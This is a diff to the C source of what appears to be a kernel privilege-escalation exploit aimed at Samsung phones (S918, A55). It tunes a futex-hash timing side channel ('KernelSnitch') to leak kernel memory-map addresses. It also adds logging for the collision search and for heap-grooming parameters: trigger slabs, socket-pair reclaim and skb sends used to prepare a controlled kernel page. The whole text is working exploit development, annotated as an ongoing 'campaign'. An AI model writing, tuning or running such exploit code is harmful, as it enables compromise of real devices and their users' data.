@@ -1091,7 +1091,12 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
     if (!state) {
       return -1;
     }
-    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
+    /* Campaign 33: the controlled search runs the A55's own measured
+     * collision profile (4096 appended, 64 repeats, average 8: ksdiag closed
+     * 3/3 at collisions=4), not the dm1q 256-append one that yielded 0. */
+    kernelsnitch_set_profile(state, S918_KSNITCH_APPENDED_FUTEXES,
+                             S918_KSNITCH_REPEAT_MEASUREMENT,
+                             S918_KSNITCH_AVERAGE);
 #ifdef QEMU_MM_TRACE_VALIDATE
     uintptr_t oracle_mm = 0;
     if (!qemu_mm_trace_drain()) {
@@ -1105,6 +1110,12 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
     int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
                    !WEXITSTATUS(status) &&
                    kernelsnitch_found_collisions(state);
+    pr_info("[coltune] phase=%s pass=%zu wanted=%zu found=%zu scans=%zu "
+            "appended=%zu repeat=%zu average=%zu hashsize=%lu ok=%d\n",
+            current_hint ? "hint" : "full", pass, state->collisions - 1,
+            state->found_collisions, state->total_futexes - 2,
+            state->appended_futexes, state->repeat_measurement,
+            state->average, futex_hashsize, child_ok);
 #ifdef QEMU_MM_TRACE_VALIDATE
     int oracle_ok = qemu_mm_trace_read(&oracle_mm);
     if (!child_ok) {
@@ -1934,6 +1945,16 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
     errno = ENOMEM;
     SYSCHK(-1);
   }
+
+  pr_info("[coltune] gate appended=%d repeat=%d average=%d base=%d "
+          "mult=%d confirm=%d hint=%d full=%d scans_max=%d cores=%d "
+          "trigger_slabs=%d skb_pairs=%d skb_sends=%d\n",
+          S918_KSNITCH_APPENDED_FUTEXES, S918_KSNITCH_REPEAT_MEASUREMENT,
+          S918_KSNITCH_AVERAGE, KERNELSNITCH_BASELINE_SAMPLES,
+          KERNELSNITCH_THRESHOLD_MULT, KERNELSNITCH_COLLISION_CONFIRMATIONS,
+          S918_KSNITCH_HINT_COLLISIONS, S918_KSNITCH_FULL_COLLISIONS,
+          S918_PAGE_SCAN_MAX, cpu_count, S918_TRIGGER_SLABS,
+          S918_RECLAIM_SOCKET_PAIRS, S918_SKB_SENDS);
 
   if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
     free(target_fds);
